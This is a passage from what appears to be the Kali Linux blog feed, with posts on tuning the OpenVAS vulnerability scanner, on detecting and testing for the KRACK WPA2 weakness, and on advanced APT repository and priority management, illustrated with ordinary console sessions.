page.</p> <p>If you find any bugs, please open a ticket on our <a href="https://bugs.kali.org/">bug tracker</a>. We keep an eye on social media but there is no substitute for a <a href="https://web.archive.org/web/20210914172345/https://kali.training/topic/filing-a-good-bug-report/">well-written bug report</a> and many bugs that get reported to us end up getting fixed in Debian, which then benefits all of its <a href="https://wiki.debian.org/Derivatives/Census">derivatives</a>.</p></description>
</item>
<item>
<title>Configuring and Tuning OpenVAS in Kali Linux</title>
<link>https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/</link>
<guid isPermaLink="true">https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/</guid>
<pubDate>Wed, 15 Nov 2017 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/tuning-openvas-kali.jpg" type="image/jpg"/>
<description><p>Users often request the addition of vulnerability scanners to Kali, most notably the ones that begin with &ldquo;N&rdquo;, but due to licensing constraints, we do not include them in the distribution. Fortunately, Kali includes the very capable <a href="https://www.openvas.org/">OpenVAS</a>, which is free and Open-source. Although we briefly <a href="https://www.kali.org/blog/openvas-vulnerability-scanning/">covered OpenVAS in the past</a>, we decided to devote a more thorough post to its setup and how to use it more effectively.</p> <p>Vulnerability scanners often have a poor reputation, primarily because their role and purpose is misunderstood. Vulnerability scanners scan for vulnerabilities&ndash;they are not magical exploit machines and should be one of many sources of <a href="https://www.kali.org/tools/kali-meta/#kali-tools-information-gathering">information</a> used in an assessment. Blindly running a vulnerability scanner against a target will almost certainly end in disappointment and woe, with dozens (or even hundreds) of low-level or uninformative results.</p> <h2 id="system-requirements">System Requirements</h2> <p>The main complaint we receive about OpenVAS (or any other vulnerability scanner) can be summarized as &ldquo;it&rsquo;s too slow and crashes and doesn&rsquo;t work and it&rsquo;s bad, and you should feel bad&rdquo;. In nearly every case, slowness and/or crashes are due to <em>insufficient system resources</em>. OpenVAS has tens of thousands of signatures and if you do not give your system enough resources, particularly RAM, you will find yourself in a world of misery. Some commercial vulnerability scanners require a <em>minimum</em> of 8GB of RAM and recommend even more.</p> <p>OpenVAS does not require anywhere near that amount of memory but the more you can provide it, the smoother your scanning system will run. For this post, our Kali virtual machine has <em>3 CPUs and 3GB of RAM</em>, which is generally sufficient to scan small numbers of hosts at once.</p> <h2 id="initial-openvas-setup-in-kali">Initial OpenVAS Setup in Kali</h2> <p>OpenVAS has many <a href="https://www.openvas.org/software.html">moving parts</a> and setting it up manually can sometimes be a challenge. Fortunately, Kali contains an easy-to-use utility called &lsquo;openvas-setup&rsquo; that takes care of setting up OpenVAS, downloading the signatures, and creating a password for the admin user.</p> <p>This initial setup can take <em>quite a long while</em>, even with a fast Internet connection so just sit back and let it do its thing. At the end of the setup, the automatically-generated password for the admin user will be displayed. Be sure to <em>save this password somewhere safe</em>:</p> <pre><code class="language-console">root@kali:~# openvas-setup ERROR: Directory for keys (/var/lib/openvas/private/CA) not found! ERROR: Directory for certificates (/var/lib/openvas/CA) not found! ERROR: CA key not found in /var/lib/openvas/private/CA/cakey.pem ERROR: CA certificate not found in /var/lib/openvas/CA/cacert.pem ERROR: CA certificate failed verification, see /tmp/tmp.7G2IQWtqwj/openvas-manage-certs.log for details. Aborting. ERROR: Your OpenVAS certificate infrastructure did NOT pass validation. See messages above for details. Generated private key in /tmp/tmp.PerU5lG2tl/cakey.pem. Generated self signed certificate in /tmp/tmp.PerU5lG2tl/cacert.pem. ... /usr/sbin/openvasmd User created with password 'xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxx'. </code></pre> <h3 id="dealing-with-setup-errors">Dealing with Setup Errors</h3> <p>Occasionally, the &lsquo;openvas-setup&rsquo; script will display errors at the end of the NVT download similar to the following:</p> <pre><code class="language-plain">(openvassd:2272): lib kb_redis-CRITICAL **: get_redis_ctx: redis connection error: No such file or directory (openvassd:2272): lib kb_redis-CRITICAL **: redis_new: cannot access redis at '/var/run/redis/redis.sock' (openvassd:2272): lib kb_redis-CRITICAL **: get_redis_ctx: redis connection error: No such file or directory openvassd: no process found </code></pre> <p>If you are unfortunate enough to encounter this issue, you can run &lsquo;openvas-check-setup&rsquo; to see what component is causing issues. In this particular instance, we receive the following from the script:</p> <pre><code class="language-plain">... ERROR: The number of NVTs in the OpenVAS Manager database is too low. FIX: Make sure OpenVAS Scanner is running with an up-to-date NVT collection and run 'openvasmd --rebuild'. ... </code></pre> <p>The &lsquo;openvas-check-setup&rsquo; scipt detects the issue and even provides the command to run to (hopefully) resolve the issue. After rebuilding the NVT collection as recommended, all checks are passed:</p> <pre><code class="language-console">root@kali:~# openvasmd --rebuild root@kali:~# openvas-check-setup openvas-check-setup 2.3.7 Test completeness and readiness of OpenVAS-9 ... It seems like your OpenVAS-9 installation is OK. ... </code></pre> <h3 id="managing-openvas-users">Managing OpenVAS Users</h3> <p>If you need (or want) to create additional OpenVAS users, run &lsquo;openvasmd&rsquo; with the <strong>--create-user</strong> option, which will add a new user and display the randomly-generated password:</p> <pre><code class="language-console">root@kali:~# openvasmd --create-user=dookie User created with password 'yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyy'. root@kali:~# openvasmd --get-users admin dookie </code></pre> <p>If you&rsquo;re anything like us, you will forget to save the admin password or accidentally delete it. Fortunately, changing OpenVAS user passwords is easily accomplished with &lsquo;openvasmd&rsquo; and the <strong>--new-password</strong> option:</p> <pre><code class="language-console">root@kali:~# openvasmd --user=dookie --new-password=s3cr3t root@kali:~# openvasmd --user=admin --new-password=sup3rs3cr3t </code></pre> <h3 id="starting-and-stopping-openvas">Starting and Stopping OpenVAS</h3> <p>Network services are disabled by default in Kali Linux so if you haven&rsquo;t configured OpenVAS to start at boot, you can start the required services by running &lsquo;openvas-start&rsquo;:</p> <pre><code class="language-console">root@kali:~# openvas-start Starting OpenVas Services </code></pre> <p>When the services finish initializing, you should find TCP ports 9390 and 9392 listening on your loopback interface:</p> <pre><code class="language-console">root@kali:~# ss -ant State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 127.0.0.1:9390 *:* LISTEN 0 128 127.0.0.1:9392 *:* </code></pre> <p>Due to the strain on system resources, you will likely want to stop OpenVAS whenever you are done using it, especially if you are not using a dedicated system for vulnerability scanning. OpenVAS can be stopped by running &lsquo;openvas-stop&rsquo;:</p> <pre><code class="language-console">root@kali:~# openvas-stop Stopping OpenVas Services </code></pre> <h2 id="using-the-greenbone-security-assistant">Using the Greenbone Security Assistant</h2> <p>The Greenbone Security Assistant is the OpenVAS web interface, available on your local machine (after starting OpenVAS) at <strong><em>https://localhost:9392</em></strong>. After accepting the self-signed certificate, you will be presented with the login page and once authenticated, you will see the main dashboard.</p> <p><p> <a href='https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas1.png'> <img src="https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas1.png" alt="" /> </a> </p> </p> <h3 id="configuring-credentials">Configuring Credentials</h3> <p>Vulnerability scanners provide the most complete results when you are able to provide the scanning engine with credentials to use on scanned systems. OpenVAS will use these credentials to log in to the scanned system and perform detailed enumeration of installed software, patches, etc. You can add credentials via the &ldquo;Credentials&rdquo; entry under the &ldquo;Configuration&rdquo; menu.</p> <p><p> <a href='https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas4.png'> <img src="https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas4.png" alt="" /> </a> </p> </p> <h3 id="target-configuration">Target Configuration</h3> <p>OpenVAS, like most vulnerability scanners, can scan for remote systems but it&rsquo;s a vulnerability scanner, not a port scanner. Rather than relying on a vulnerability scanner for identifying hosts, you will make your life much easier by using a dedicated network scanner like <a href="https://www.kali.org/tools/nmap/">Nmap</a> or <a href="https://www.kali.org/tools/masscan/">Masscan</a> and import the list of targets in OpenVAS:</p> <pre><code class="language-console">root@kali:~# nmap -sn -oA nmap-subnet-86 192.168.86.0/24 root@kali:~# grep Up nmap-subnet-86.gnmap | cut -d &quot; &quot; -f 2 &gt; live-hosts.txt </code></pre> <p>Once you have your list of hosts, you can import them under the &ldquo;Targets&rdquo; section of the &ldquo;Configuration&rdquo; menu.</p> <p><p> <a href='https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas6.png'> <img src="https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas6.png" alt="" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas7.png'> <img src="https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas7.png" alt="" /> </a> </p> </p> <h3 id="scan-configuration">Scan Configuration</h3> <p>Prior to launching a vulnerability scan, you should fine-tune the Scan Config that will be used, which can be done under the &ldquo;Scan Configs&rdquo; section of the &ldquo;Configuration&rdquo; menu. You can clone any of the default Scan Configs and edit its options, disabling any services or checks that you don&rsquo;t require. If you use Nmap to conduct some prior analysis of your target(s), you can save hours of vulnerability scanning time.</p> <p><p> <a href='https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas8.png'> <img src="https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas8.png" alt="" /> </a> </p> </p> <h3 id="task-configuration">Task Configuration</h3> <p>Your credentials, targets, and scan configurations are setup so now you&rsquo;re ready to put everything together and run a vulnerability scan. In OpenVAS, vulnerability scans are conducted as &ldquo;Tasks&rdquo;. When you set up a new task, you can further optimize the scan by either increasing or decreasing the concurrent activities that take place. With our system with 3GB of RAM, we adjusted our task settings as shown below.</p> <p><p> <a href='https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas9.png'> <img src="https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas9.png" alt="" /> </a> </p> </p> <p>With our more finely-tuned scan settings and target selection, the results of our scan are much more useful.</p> <p><p> <a href='https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas10.png'> <img src="https://www.kali.org/blog/configuring-and-tuning-openvas-in-kali-linux/images/openvas10.png" alt="" /> </a> </p> </p> <h2 id="automating-openvas">Automating OpenVAS</h2> <p>One of the lesser-known features of OpenVAS is its <a href="https://www.openvas.org/src-doc/openvas-cli/index.html">command-line interface</a>, which you interact with via the &lsquo;omp&rsquo; command. Its usage isn&rsquo;t entirely intuitive but we aren&rsquo;t the only fans of OpenVAS and we came across a couple of basic scripts that you can use and extend to automate your OpenVAS scans.</p> <p>The first is <a href="https://gist.github.com/mgeeky/a038f809dff4d308db94f5f657908da7">openvas-automate.sh by mgeeky</a>, a semi-interactive Bash script that prompts you for a scan type and takes care of the rest. The scan configs are hard-coded in the script so if you want to use your customized configs, they can be added under the &ldquo;targets&rdquo; section:</p> <pre><code class="language-console">root@kali:~# apt -y install pcregrep root@kali:~# ./openvas-automate.sh 192.168.86.61 :: OpenVAS automation script. mgeeky, 0.1 [&gt;] Please select scan type: 1. Discovery 2. Full and fast 3. Full and fast ultimate 4. Full and very deep 5. Full and very deep ultimate 6. Host Discovery 7. System Discovery 9. Exit -------------------------------- Please select an option: 5 [+] Tasked: 'Full and very deep ultimate' scan against '192.168.86.61' [&gt;] Reusing target... [+] Target's id: 6ccbb036-4afa-46d8-b0c0-acbd262532e5 [&gt;] Creating a task... [+] Task created successfully, id: '8e77181c-07ac-4d2c-ad30-9ae7a281d0f8' [&gt;] Starting the task... [+] Task started. Report id: 6bf0ec08-9c60-4eb5-a0ad-33577a646c9b [.] Awaiting for it to finish. This will take a long while... 8e77181c-07ac-4d2c-ad30-9ae7a281d0f8 Running 1% 192.168.86.61 </code></pre> <p>We also came across a <a href="https://code610.blogspot.com/2016/12/automated-scans-with-openvas-and-kali.html">blog post by code16</a> that introduces and explains their <a href="https://github.com/c610/tmp/blob/master/code16.py">Python script for interacting with OpenVAS</a>. Like the Bash script above, you will need to make some slight edits to the script if you want to customize the scan type:</p> <pre><code class="language-console">root@kali:~# ./code16.py 192.168.86.27 ------------------------------------------------------------------------------ code16 ------------------------------------------------------------------------------ small wrapper for OpenVAS 6 [+] Found target ID: 19f3bf20-441c-49b9-823d-11ef3b3d18c2 [+] Preparing options for the scan... [+] Task ID = 28c527f8-b01c-4217-b878-0b536c6e6416 [+] Running scan for 192.168.86.27 [+] Scan started... To get current status, see below: zZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzz ... zZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzzZzz [+] Scan looks to be done. Good. [+] Target scanned. Finished taskID : 28c527f8-b01c-4217-b878-0b536c6e6416 [+] Cool! We can generate some reports now ... :) [+] Looking for report ID... [+] Found report ID : 5ddcb4ed-4f96-4cee-b7f3-b7dad6e16cc6 [+] For taskID : 28c527f8-b01c-4217-b878-0b536c6e6416 [+] Preparing report in PDF for 192.168.86.27 [+] Report should be done in : Report_for_192.168.86.27.pdf [+] Thanks. Cheers! </code></pre> <p>With the wide range of options available in OpenVAS, we were only really able to just scratch the surface in this post but if you take your time and effectively tune your vulnerability scans, you will find that the bad reputation of OpenVAS and other vulnerability scanners is undeserved. The number of connected devices in our homes and workplaces is increasing all the time and managing them becomes more of a challenge. Making effective use of a vulnerability scanner can make that management at least a little bit easier.</p></description>
</item>
<item>
<title>Kali on KRACK</title>
<link>https://www.kali.org/blog/kali-on-krack/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-on-krack/</guid>
<pubDate>Thu, 19 Oct 2017 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-on-krack/images/kali-krack-wpa2-attack.jpg" type="image/jpg"/>
<description><h2 id="wpa2-key-reinstallation-attack-or-krack-attack">WPA2 Key Reinstallation AttaCK or KRACK attack</h2> <p>Recently, Mathy Vanhoef of imec-DistriNet, KU Leuven, discovered a serious weakness in WPA2 known as the <a href="https://www.krackattacks.com/">Key Reinstallation AttaCK (or KRACK) attack</a>. Their overview, Key Reinstallation Attacks: Breaking WPA2 by forcing nonce reuse, and research paper (<a href="https://papers.mathyvanhoef.com/ccs2017.pdf">Key Reinstallation Attacks: Forcing Nonce Reuse in WPA2, co-authored by Frank Piessens</a>) have created quite a stir in our industry because the press touts that it &ldquo;breaks Wi-Fi&rdquo;.</p> <p>There have been numerous articles written about this vulnerability, and we won&rsquo;t rehash them here. However, we want to take a moment to talk about how this relates to Kali Linux, from a defensive, testing, and detection standpoint.</p> <h3 id="is-kali-linux-vulnerable">Is Kali Linux Vulnerable?</h3> <p>From a defensive standpoint, if you&rsquo;re keeping up with your Kali Linux rolling updates (via a simple &ldquo;apt update &amp;&amp; apt upgrade), you&rsquo;re already patched against this vulnerability thanks to patches in <a href="https://packages.debian.org/buster/wpasupplicant">wpasupplicant</a> and <a href="https://packages.debian.org/buster/hostapd">hostapd</a> (both at 2.4-1.1). To be entirely clear: an <em>updated</em> version of Kali Linux is <em>not vulnerable</em> to this attack. You are keeping your Kali Linux system up-to-date, aren&rsquo;t you?</p> <h3 id="how-do-i-test-for-the-vulnerability">How do I test for the Vulnerability?</h3> <p>With your Kali system updated, there are also some steps you can take to test for this vulnerability on your access points. <a href="https://github.com/vanhoefm/krackattacks-test-ap-ft">Mathy Vanhoef recently released a script</a> that can be run from Kali Linux to test whether or not your access point (AP) is affected by <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-13082">CVE-2017-13082</a> or specifically the Key Reinstall in FT Handshake vulnerability found in 802.11r devices. The script requires that you authenticate to the access point, but bear in mind that it may incorrectly flag an AP as vulnerable due to &ldquo;benign retransmissions of data frames&rdquo;.</p> <h3 id="how-can-i-detect-attacks">How can I Detect Attacks?</h3> <p><a href="https://twitter.com/KismetWireless">Dragorn</a>, the author of the amazing <a href="https://kismetwireless.net/">Kismet</a>, has released lots of great information on the subject on <a href="https://www.kismetwireless.net/year-archive">his blog</a>, including excellent info about detecting KRACK attacks using Kismet. He explains that the <a href="https://github.com/kismetwireless/kismet">git-master version of Kismet</a> is, &ldquo;introducing alerts to attempt to detect a Krack-style attack&rdquo;.</p> <p><p> <a href='https://www.kali.org/blog/kali-on-krack/images/krack-alert.png'> <img src="https://www.kali.org/blog/kali-on-krack/images/krack-alert.png" alt="" /> </a> </p> </p> <p>These alerts track spoofed access points, multichannel access points, zero-length keys, zero nonce in a handshake, and nonce retransmission, all factors that could point to a KRACK attack in progress.</p> <p>Dragorn warns that since Kismet hops channels, it could miss handshake packets and therefore miss the attack. In addition, he says that false positives are still possible despite Kismet&rsquo;s packet de-duplication and that once real proof-of-concept code is released for KRACK, the logic of these alerts may need to be adjusted.</p> <p>Dragorn also explains that, &ldquo;it looks like you can still trip the kismet nonce detection w/ a packet flagged in the frame control as a retransmit&rdquo; but despite these drawbacks, Kismet is still a decent system for detection of this and other Wi-Fi protocol attacks.</p> <p><p> <a href='https://www.kali.org/blog/kali-on-krack/images/kistmet-krack-detect.png'> <img src="https://www.kali.org/blog/kali-on-krack/images/kistmet-krack-detect.png" alt="" /> </a> </p> </p> <h4 id="to-install-the-git-master-version-of-kismet-on-kali-linux-follow-these-steps">To install the git-master version of Kismet on Kali Linux, follow these steps</h4> <p>First, tell networkmanager to ignore the Wi-Fi device by adding these lines:</p> <pre><code class="language-ini">[keyfile] unmanaged-devices=interface-name:wlan0 </code></pre> <p>to <code>/etc/NetworkManager/NetworkManager.conf</code></p> <p>Then, restart NetworkManager:</p> <pre><code class="language-console">root@kali:~# systemctl restart NetworkManager </code></pre> <p>Next, install updates and the git-master version of Kismet:</p> <pre><code class="language-console">root@kali:~# apt update root@kali:~# apt upgrade root@kali:~# git clone https://www.kismetwireless.net/git/kismet.git root@kali:~# apt install build-essential libmicrohttpd-dev libnl-3-dev libnl-genl-3-dev libcap-dev libpcap-dev libncurses5-dev libnm-dev libdw-dev libsqlite3-dev root@kali:~# cd kismet root@kali:~# ./configure root@kali:~# make root@kali:~# make suidinstall root@kali:~# /usr/local/bin/kismet_capture_tools/kismet_cap_linux_wifi --list root@kali:~# kismet -c wlan0 </code></pre> <p>Next you can browse to <strong><em>http://localhost:2501</em></strong> to view the Kismet interface and any alerts. Be sure to log in with the credentials found in <code>~/.kismet/kismet_httpd.conf</code> to get full functionality. You can also build and run the capture tools on separate machines, allowing you to monitor from several endpoints and view the alerts on a single centralized server.</p> <p>Overall, this vulnerability is not the end of the world. As <a href="https://twitter.com/grifter801/status/920132813680193538">@grifter801</a> puts it, this vulnerability encourages this shocking approach: <em>&ldquo;Patch your stuff. Use 2FA. Use HTTPS.&rdquo;</em> We couldn&rsquo;t agree more.</p> <p>We also encourage you to consider the defensive, testing, and detection perspectives of any new vulnerability to help you become more aware of the finer details of the vulnerability, gain insight about it, and become part of the solution.</p> <p>Thanks to OffSec and Kali team member @Steev for the technical resources used in this article.</p></description>
</item>
<item>
<title>Advanced Package Management in Kali Linux</title>
<link>https://www.kali.org/blog/advanced-package-management-in-kali-linux/</link>
<guid isPermaLink="true">https://www.kali.org/blog/advanced-package-management-in-kali-linux/</guid>
<pubDate>Tue, 26 Sep 2017 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/advanced-package-management-in-kali-linux/images/kali-advanced-package-management-2.jpg" type="image/jpg"/>
<description><p>The <a href="https://en.wikipedia.org/wiki/APT_(Debian)">Advanced Package Tool</a> (APT) is how programs, libraries, documentation, and even the kernel itself are installed and managed on Kali and other Debian-based derivatives. APT often works so well that many users don&rsquo;t pay any particular attention to it other than to perhaps search for and install programs and (hopefully) update their system regularly.</p> <p>For most standard users, making use of APT this way is perfectly normal but we like to think that people who use Kali Linux are not standard users (in a good way) and so we are devoting this post to telling how you to get better use of APT and how to take advantage of the wide ecosystem of packages that are available, while keeping your Kali system stable and happy.</p> <p>Many people will tell you that you should not rely on a package manager at all and instead, you should compile everything from scratch because you will learn more that way. While it&rsquo;s certainly true that you will learn a lot, especially as you start out, building everything by hand will quickly devolve into tedium when you could be spending your time hacking or learning something new, preferably both.</p> <p>In this post, we&rsquo;ll show you how you can safely add additional package repositories to your Kali installation, how to upgrade and downgrade them, and how to ensure all of these repositories live in harmony. APT is very powerful and will evaluate the available packages from all sources as a whole when it formulates its solutions.</p> <h2 id="adding-package-sources-to-kali-linux">Adding Package Sources to Kali Linux</h2> <p>If you want to make your future self happy, you should not directly edit <strong><em>/etc/apt/sources.list</em></strong> directly. For each new package repository you add to your system, create a new file with a descriptive name (like <strong><em>debian-unstable.list</em></strong>) under <strong><em>/etc/apt/sources.list.d/</em></strong>. By leaving the original <strong><em>sources.list</em></strong> file untouched, if Kali needs to update it, it won&rsquo;t interrupt you during the update, asking you which version of the file to keep.</p> <p>In this post, we are going to add the <a href="https://www.kali.org/blog/bleeding-edge-kali-repositories/">Kali Bleeding-Edge</a> repository and the Debian <a href="https://wiki.debian.org/DebianUnstable">Unstable</a> and <a href="https://wiki.debian.org/DebianExperimental">Experimental</a> repositories.</p> <h3 id="the-kali-bleeding-edge-repository">The kali-bleeding-edge Repository</h3> <p>The kali-bleeding-edge repository contains a number of tools that are very popular and change very frequently (even daily). It would be impractical and time-consuming to manually create and test updated packages so the packages in this repository are generated automatically whenever the upstream source changes. On the positive side, it means you are never more than 24 hours behind the upstream project but on the downside, these packages are not tested so you need to be aware that the packages in this repository may break from time to time.</p> <p>You can add the repo and update the list of available packages as follows:</p> <pre><code class="language-sh">echo &quot;deb http://http.kali.org/kali kali-bleeding-edge main contrib non-free&quot; &gt; /etc/apt/sources.list.d/bleeding-edge.list apt update </code></pre> <p>To install a package from kali-bleeding-edge, you need to append the repository name to the package name:</p> <pre><code class="language-sh">apt install dnsrecon/kali-bleeding-edge </code></pre> <p>Fortunately, APT makes it an easy to downgrade back to the kali-rolling version of a particular package at any time, so there is no need to fear the packages in the kali-bleeding-edge repository. If you find that a package is broken in kali-bleeding-edge, you can revert back to the kali-rolling version in the same manner:</p> <pre><code class="language-sh">apt install dnsrecon/kali-rolling </code></pre> <h3 id="the-debian-unstable-and-experimental-repositories">The Debian Unstable and Experimental Repositories</h3> <p>Kali Linux is a <a href="https://wiki.debian.org/Derivatives/Census">derivative of Debian</a> Testing, which has more up-to-date software than Debian Stable. For even more recent software, there is the Debian Unstable distribution, which is a rolling development version of Debian, containing the most recent packages. When you encounter a bug in a Debian package, there might be a fixed version in the Debian Unstable repository so it is a good idea to add it to your Kali system. As with kali-bleeding-edge, the packages in Unstable may break from time to time.</p> <p>Debian Experimental is yet another repository that contains packages that are under development. The packages in this repository are very current but can also be very buggy, more so than kali-bleeding-edge or Debian Unstable. APT will only install packages from this repository if you explicitly request them and you can always downgrade if things don&rsquo;t work out:</p> <pre><code class="language-sh">echo &quot;deb http://ftp.debian.org/debian unstable main contrib non-free&quot; &gt; /etc/apt/sources.list.d/debian.list echo &quot;deb http://deb.debian.org/debian experimental main&quot; &gt;&gt; /etc/apt/sources.list.d/debian.list apt update </code></pre> <p>As with the kali-bleeding-edge packages, if you want to install packages from unstable or experimental, append the repository name to the end of the package name as shown below:</p> <pre><code class="language-console">root@kali:~# apt install socat/experimental netperf/unstable Reading package lists... Done Building dependency tree Reading state information... Done Selected version '2.0.0~beta9-1' (Debian:experimental [amd64]) for 'socat' Selected version '2.6.0-2.1' (kali-rolling, Debian:unstable [amd64]) for 'netperf' The following NEW packages will be installed: netperf The following packages will be upgraded: socat 1 upgraded, 1 newly installed, 0 to remove and 0 not upgraded. Need to get 909 kB of archives. After this operation, 1,127 kB of additional disk space will be used. Get:1 http://kali.mirror.globo.tech/kali kali-rolling/non-free amd64 netperf amd64 2.6.0-2.1 [544 kB] Get:2 http://deb.debian.org/debian experimental/main amd64 socat amd64 2.0.0~beta9-1 [365 kB] Fetched 909 kB in 1s (555 kB/s) Reading changelogs... Done apt-listchanges: Mailing root: apt-listchanges: news for kali Selecting previously unselected package netperf. (Reading database ... 287650 files and directories currently installed.) Preparing to unpack .../netperf_2.6.0-2.1_amd64.deb ... Unpacking netperf (2.6.0-2.1) ... Preparing to unpack .../socat_2.0.0~beta9-1_amd64.deb ... Unpacking socat (2.0.0~beta9-1) over (1.7.3.2-1) ... Setting up socat (2.0.0~beta9-1) ... Processing triggers for systemd (234-3) ... Processing triggers for man-db (2.7.6.1-2) ... Setting up netperf (2.6.0-2.1) ... update-rc.d: We have no instructions for the netperf init script. update-rc.d: It looks like a network service, we disable it. Processing triggers for systemd (234-3) ... </code></pre> <h2 id="determining-package-priorities">Determining Package Priorities</h2> <p>In order to determine what packages get installed, APT has <em>priorities</em> assigned for all package sources, with the highest priority number taking precedence. A package with a priority of <em>0</em> will never be installed and a package with a priority over <em>1000</em> will always be installed, even if it means downgrading the package.</p> <p>This is all well and good for APT but how can you, the user, see what the priority is of a given package? Enter the little-known &lsquo;apt-cache&rsquo; command and its &lsquo;policy&rsquo; option, which displays all of your configured repositories and their priorities:</p> <pre><code class="language-console">root@kali:~# apt-cache policy Package files: 100 /var/lib/dpkg/status release a=now 1 http://deb.debian.org/debian experimental/main amd64 Packages release o=Debian,a=experimental,n=experimental,l=Debian,c=main,b=amd64 origin deb.debian.org 500 http://ftp.debian.org/debian unstable/non-free amd64 Packages release o=Debian,a=unstable,n=sid,l=Debian,c=non-free,b=amd64 origin ftp.debian.org 500 http://ftp.debian.org/debian unstable/contrib amd64 Packages release o=Debian,a=unstable,n=sid,l=Debian,c=contrib,b=amd64 origin ftp.debian.org 500 http://ftp.debian.org/debian unstable/main amd64 Packages release o=Debian,a=unstable,n=sid,l=Debian,c=main,b=amd64 origin ftp.debian.org 100 http://http.kali.org/kali kali-bleeding-edge/main amd64 Packages release o=Kali,n=kali-bleeding-edge,c=main,b=amd64 origin http.kali.org 990 http://http.kali.org/kali kali-rolling/contrib amd64 Packages release o=Kali,a=kali-rolling,n=kali-rolling,c=contrib,b=amd64 origin http.kali.org 990 http://http.kali.org/kali kali-rolling/non-free amd64 Packages release o=Kali,a=kali-rolling,n=kali-rolling,c=non-free,b=amd64 origin http.kali.org 990 http://http.kali.org/kali kali-rolling/main amd64 Packages release o=Kali,a=kali-rolling,n=kali-rolling,c=main,b=amd64 origin http.kali.org Pinned packages: </code></pre> <p>You will note that kali-rolling, as the default distribution, has the highest priority at 990, meaning its packages take precedence over all others (which is what you want as a Kali user), followed by Debian unstable at 500, kali-bleeding-edge at 100, and lastly, experimental, with a lowly priority of 1. To see how these priorities apply to a given package, take a look at <a href="http://sqlmap.org/">sqlmap</a>:</p> <pre><code class="language-console">root@kali:~# apt-cache policy sqlmap sqlmap: Installed: 1.1.9-1 Candidate: 1.1.9-1 Version table: 1.1.9+0~git1505273832.7de63a-1 100 100 http://http.kali.org/kali kali-bleeding-edge/main amd64 Packages *** 1.1.9-1 990 990 http://http.kali.org/kali kali-rolling/main amd64 Packages 500 http://ftp.debian.org/debian unstable/main amd64 Packages 100 /var/lib/dpkg/status </code></pre> <p>Even though the version of sqlmap in kali-bleeding-edge is newer, it will not be installed because it only has a priority of 100, versus the installed version, which has a priority of 990. It is for this reason that when you want to install a package from a different package repository, it needs to be requested explicitly:</p> <pre><code class="language-console">root@kali:~# apt install sqlmap/kali-bleeding-edge Reading package lists... Done Building dependency tree Reading state information... Done Selected version '1.1.9+0~git1505273832.7de63a-1' (http.kali.org [all]) for 'sqlmap' The following packages will be upgraded: sqlmap 1 upgraded, 0 newly installed, 0 to remove and 0 not upgraded. Need to get 6,789 kB of archives. After this operation, 2,048 B of additional disk space will be used. Get:1 http://kali.mirror.globo.tech/kali kali-bleeding-edge/main amd64 sqlmap all 1.1.9+0~git1505273832.7de63a-1 [6,789 kB] Fetched 6,789 kB in 5s (1,192 kB/s) Reading changelogs... Done (Reading database ... 287587 files and directories currently installed.) Preparing to unpack .../sqlmap_1.1.9+0~git1505273832.7de63a-1_all.deb ... Unpacking sqlmap (1.1.9+0~git1505273832.7de63a-1) over (1.1.9-1) ... Setting up sqlmap (1.1.9+0~git1505273832.7de63a-1) ... Processing triggers for man-db (2.7.6.1-2) ... </code></pre> <h2 id="apt-configuration">APT Configuration</h2> <h3 id="setting-the-default-distribution">Setting the Default Distribution</h3> <p>Now that you have some extra repositories added to your system, you will want to begin exploring and installing new packages, but before you do, it&rsquo;s a good idea to tell APT what your <em>default distribution</em> is, which for Kali Linux users, is &ldquo;kali-rolling&rdquo;. This way your system won&rsquo;t upgrade to some other distribution without your consent. Configure your default distribution by adding &ldquo;APT::Default-Release &ldquo;kali-rolling&rdquo;;&rdquo; to <strong><em>/etc/apt/apt.conf.d/local</em></strong>:</p> <pre><code class="language-console">root@kali:~# cat /etc/apt/apt.conf.d/local APT::Default-Release &quot;kali-rolling&quot;; </code></pre> <p>With your default distribution configured, any time you run &lsquo;apt full-upgrade&rsquo;, it will apply the upgrade to kali-rolling, helping keep your system stable.</p> <h3 id="reducing-upgrade-prompts">Reducing Upgrade Prompts</h3> <p>If you use any Debian derivative for a significant amount of time, you will come across a prompt while running &lsquo;apt upgrade&rsquo; asking you about a configuration file and whether you want to keep the local version, use the new version, or compare them. More often than not, you will find yourself accepting the default, making these interruptions wasteful.</p> <p>You can avoid these prompts by updating your <strong><em>/etc/apt/apt.conf.d/local</em></strong> file with &lsquo;DPkg::options { &ldquo;&ndash;force-confdef&rdquo;; &ldquo;&ndash;force-confold&rdquo;; }&rsquo; as shown below. This line tells APT to try to choose by itself if the files have not changed (&ndash;force-confdef) and if the files are different, keep the existing version (&ndash;force-confold):</p> <pre><code 